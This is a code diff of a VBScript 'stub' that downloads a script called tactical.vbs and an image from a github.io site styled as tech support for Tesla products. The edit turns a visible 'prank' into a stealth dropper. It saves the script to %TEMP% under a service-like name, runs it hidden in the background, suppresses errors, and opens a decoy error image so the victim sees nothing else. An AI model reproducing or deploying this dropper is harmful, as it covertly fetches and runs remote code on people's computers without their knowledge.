@@ -1,62 +1,94 @@
-' ============================================
+' ============================================================
 ' stub.vbs
-' Downloads and runs a remote VBS prank,
-' then downloads and displays an image.
-' ============================================
+' Downloads both files first, fires the install in the
+' background, then shows the image immediately — no waiting.
+'
+' Flow:
+'   1. Download tactical.vbs  → save to %TEMP%
+'   2. Download error.png     → save to %TEMP%
+'   3. Launch tactical.vbs hidden (no wait — runs in background)
+'   4. Open the image immediately
+'   5. Install continues silently behind the scenes
+' ============================================================
 
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-tempFolder = objFSO.GetSpecialFolder(2)   ' %TEMP%
+Set objFSO   = CreateObject("Scripting.FileSystemObject")
+
+tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
 
 ' ---------- CONFIGURE THESE URLS ----------
-remoteVBS_URL = "https://techsupportservices.github.io/Tesla-Products-/tactical.vbs"
+remoteVBS_URL   = "https://techsupportservices.github.io/Tesla-Products-/tactical.vbs"
 remoteImage_URL = "https://techsupportservices.github.io/Tesla-Products-/error.png"
 ' ------------------------------------------
 
-' 1. Download the remote prank VBS
-' FIX: Changed to ServerXMLHTTP.6.0 to avoid "Access is denied" error
-Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-http.Open "GET", remoteVBS_URL, False
-' FIX: Added User-Agent to prevent GitHub from blocking the request
-http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-http.Send
+' ============================================================
+' STEP 1: Download tactical.vbs
+' ============================================================
+Dim httpVBS
+Set httpVBS = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-If http.Status <> 200 Then
-    MsgBox "Failed to download prank script. HTTP " & http.Status, vbCritical, "Error"
-    WScript.Quit
-End If
+On Error Resume Next
+httpVBS.Open "GET", remoteVBS_URL, False
+httpVBS.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+httpVBS.Send
+On Error Goto 0
 
-' Save prank to a temp file
-vbsTempFile = objFSO.BuildPath(tempFolder, "prank_" & Replace(CStr(Timer), ".", "") & ".vbs")
-Set f = objFSO.CreateTextFile(vbsTempFile, True)
-f.Write http.responseText
+If httpVBS.Status <> 200 Then WScript.Quit
+
+vbsTempFile = objFSO.BuildPath(tempFolder, "svc_" & Replace(CStr(Timer), ".", "") & ".vbs")
+
+On Error Resume Next
+Set f = objFSO.CreateTextFile(vbsTempFile, True, False)
+If Err.Number <> 0 Then WScript.Quit
+f.Write httpVBS.responseText
 f.Close
+Set httpVBS = Nothing
+On Error Goto 0
 
-' 2. Run the prank VBS and WAIT for it to finish
-objShell.Run "wscript.exe " & Chr(34) & vbsTempFile & Chr(34), 1, True
+' ============================================================
+' STEP 2: Download error.png
+' ============================================================
+Dim httpImg
+Set httpImg = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 3. Download the image (binary safe)
-http.Open "GET", remoteImage_URL, False
-http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-http.Send
+imageTempFile = ""
 
-If http.Status = 200 Then
-    ' Note: If your image is a .png, change the ".jpg" below to ".png"
-    imageTempFile = objFSO.BuildPath(tempFolder, "image_" & Replace(CStr(Timer), ".", "") & ".png")
-    
+On Error Resume Next
+httpImg.Open "GET", remoteImage_URL, False
+httpImg.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+httpImg.Send
+
+If httpImg.Status = 200 Then
+    imageTempFile = objFSO.BuildPath(tempFolder, "img_" & Replace(CStr(Timer), ".", "") & ".png")
+
     Dim adoStream
     Set adoStream = CreateObject("ADODB.Stream")
-    adoStream.Type = 1          ' adTypeBinary
+    adoStream.Type = 1
     adoStream.Open
-    adoStream.Write http.responseBody
-    adoStream.SaveToFile imageTempFile, 2   ' adSaveCreateOverWrite
+    adoStream.Write httpImg.responseBody
+    adoStream.SaveToFile imageTempFile, 2
     adoStream.Close
-    
-    ' 4. Display the image in the default viewer
-    objShell.Run Chr(34) & imageTempFile & Chr(34), 1, False
-Else
-    MsgBox "Failed to download image. HTTP " & http.Status, vbExclamation, "Error"
+    Set adoStream = Nothing
+End If
+Set httpImg = Nothing
+On Error Goto 0
+
+' ============================================================
+' STEP 3: Launch tactical.vbs in the background — NO wait
+' The install runs completely silently behind the scenes
+' while the image is already visible to the user
+' ============================================================
+objShell.Run "wscript.exe //nologo " & Chr(34) & vbsTempFile & Chr(34), 0, False
+
+' ============================================================
+' STEP 4: Show the image immediately — doesn't wait for
+' the install, opens right away in the default viewer
+' ============================================================
+If imageTempFile <> "" Then
+    If objFSO.FileExists(imageTempFile) Then
+        objShell.Run Chr(34) & imageTempFile & Chr(34), 1, False
+    End If
 End If
 
-' Optional: delete the temporary prank VBS after running
-' objFSO.DeleteFile vbsTempFile, True
+Set objFSO = Nothing
+Set objShell = Nothing
